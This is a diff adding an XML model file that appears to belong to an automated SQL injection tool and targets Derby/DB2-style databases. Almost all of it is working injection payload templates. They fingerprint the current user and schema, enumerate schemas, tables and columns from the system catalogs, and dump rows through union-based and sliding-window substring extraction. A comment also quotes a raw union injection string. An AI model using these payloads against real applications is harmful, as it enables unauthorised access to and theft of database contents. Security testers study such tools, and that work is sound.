@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+SELECT 
+    '-'
+    ||'${ENCLOSE_VALUE_SQL}'
+    ||CURRENT SCHEMA
+    ||'${ENCLOSE_VALUE_SQL}'
+    ||CURRENT_USER
+    ||'${TRAIL_SQL}'
+from SYSIBM.SYSDUMMY1
+        </info>
+        <schema>
+            <database>
+/**
+ * aggreg function return exec fault
+ * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
+ * => use limit 1,1 instead
+ */
+select 
+    '${ENCLOSE_VALUE_SQL}'
+    ||schemaname
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+FROM SYS.SYSSCHEMAS
+{limit}
+            </database>
+            <table>
+select 
+    '${ENCLOSE_VALUE_SQL}'
+    ||trim(tablename)
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+from sys.systables t
+inner join sys.sysschemas s on t.schemaid=s.schemaid 
+where schemaname='${DATABASE}'
+{limit}
+            </table>
+            <column>
+select 
+    '${ENCLOSE_VALUE_SQL}'
+    ||trim(columnname)
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+from sys.systables t
+inner join sys.sysschemas s on t.schemaid=s.schemaid
+inner join sys.syscolumns c on t.tableid=c.referenceid
+where schemaname='${DATABASE}'
+and tablename='${TABLE}'
+/**
+ * TODO casting numeric to string not possible with getValues()
+ * => hiding numeric columns
+ */
+and columndatatype||''not like'DOUBLE%'
+and columndatatype||''not like'INTEGER%'
+and columndatatype||''not like'DECIMAL%'
+and columndatatype||''not like'BLOB%'
+{limit}
+            </column>
+            <row>
+                <query>
+SELECT 
+    '${ENCLOSE_VALUE_SQL}'
+    ||${FIELDS}
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+from ${DATABASE}.${TABLE}
+{limit}
+                </query>
+                <fields>
+                <field>trim(coalesce(${FIELD},''))</field>
+                <concat>||'%7f'||</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+select
+    /**
+     * If reach end of string (SQLii) then NULLIF nullifies the result
+     */
+    'SQLi'||
+    NULLIF(
+        substr(
+            (${INJECTION}),
+            ${INDEX}
+        ),
+        '${TRAIL_SQL}'
+    )
+from SYSIBM.SYSDUMMY1
+            </slidingWindow>
+            <limit> OFFSET ${LIMIT} ROWS FETCH NEXT 1 ROWS ONLY</limit>
+            <failsafe>trim(cast((1337${INDICE}7330%2b1)as char(254)))</failsafe>
+            <calibrator>'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'</calibrator>
+            <limitBoundary>0</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${INDICES} from SYSIBM.SYSDUMMY1</indices>
+            <capacity>(select 'SQLi${INDICE}'||${CALIBRATOR}||'iLQS'from SYSIBM.SYSDUMMY1)</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+    </strategy>
+</model>
